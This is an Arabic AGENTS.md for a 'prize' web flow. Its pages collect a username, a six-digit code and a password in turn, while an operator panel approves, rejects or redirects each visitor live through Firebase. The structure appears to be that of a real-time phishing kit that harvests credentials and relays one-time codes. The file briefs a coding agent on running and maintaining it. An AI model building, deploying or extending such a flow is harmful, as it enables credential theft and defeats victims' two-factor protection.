# AGENTS.md — مشروع صفحات الجوائز (prize flow)

مشروع مختصر يحتوي **فقط** مسار الجوائز: أربع صفحات + سكربتاتها + خادم Python بسيط.

## التشغيل

```bash
cp .env.example .env      # ثم املأ مفاتيح Firebase
python3 build_env_js.py   # يولّد assets/js/firebase-env.js (للاستضافة الثابتة)
python3 serve.py          # PORT افتراضي 12001
```

- `/` → `index.html` (صفحة الدخول)
- أي مسار غير موجود → `index.html` (fallback)

## الملفات

| ملف | الدور |
|---|---|
| `index.html` | شاشة البداية: زر «تسجيل الدخول» → `prize-username.html` |
| `prize-username.html` | إدخال اسم المستخدم ثم الرقم السري (6 أرقام) → `prize-wait.html` |
| `prize-wait.html` | انتظار قرار المدير: موافقة → `prize-text-password.html`، رفض → عودة إلى `prize-username.html` |
| `prize-text-password.html` | إدخال كلمة المرور النصية → `prize-wait.html` |
| `assets/js/firebase-client.js` | تهيئة Firebase، الجلسة `sessionId`، `submitLogin`/`submitOtp`، `listenForAdminCommands` |
| `assets/js/page-commands.js` | استماع صفحات العميل لأوامر التوجيه/الرفض من لوحة التحكم |
| `assets/js/firebase-env.js` | **مولّد** من `.env` عبر `build_env_js.py` (غير مرفوع في Git) |
| `serve.py` | خادم HTTP: يحقن `window.__FIREBASE_ENV__`، gzip، كاش، `/healthz` |
| `firebase_config.py` | قراءة المفاتيح من متغيّرات البيئة أو `.env` |
| `firebase.json` / `firestore.rules` / `database.rules.json` | إعداد ونشر قواعد Firebase |
| `netlify.toml` / `_redirects` | إعداد الاستضافة الثابتة (Netlify) |

## متغيّرات البيئة (`.env`)

`FIREBASE_API_KEY`, `FIREBASE_AUTH_DOMAIN`, `FIREBASE_DATABASE_URL`, `FIREBASE_PROJECT_ID`,
`FIREBASE_STORAGE_BUCKET`, `FIREBASE_MESSAGING_SENDER_ID`, `FIREBASE_APP_ID`,
`FIREBASE_MEASUREMENT_ID` — إعدادات عامة تُحقن في المتصفح.

`FIREBASE_PANEL_EMAIL`, `FIREBASE_PANEL_PASSWORD` — حساب المصادقة مع Firestore
(مطلوب: تسجيل الدخول المجهول معطّل). بدونهما تفشل كتابة/قراءة بيانات العميل.

`SITE_URL` — اختياري، النطاق العام للروابط المطلقة.

## مسار البيانات في Firebase

- `customers/{sessionId}` (Firestore): بيانات العميل + `decision` (`pending` / `approved` / `rejected`)
- `commands/{sessionId}/redirect|approval|rejection` (RTDB): أوامر لوحة التحكم
- `messages/{sessionId}` (RTDB): رسائل للعميل

قرار المدير يُقرأ عبر `onSnapshot` + استطلاع REST كل ثانيتين، ويُصفَّر إلى `pending` بعد التنفيذ.
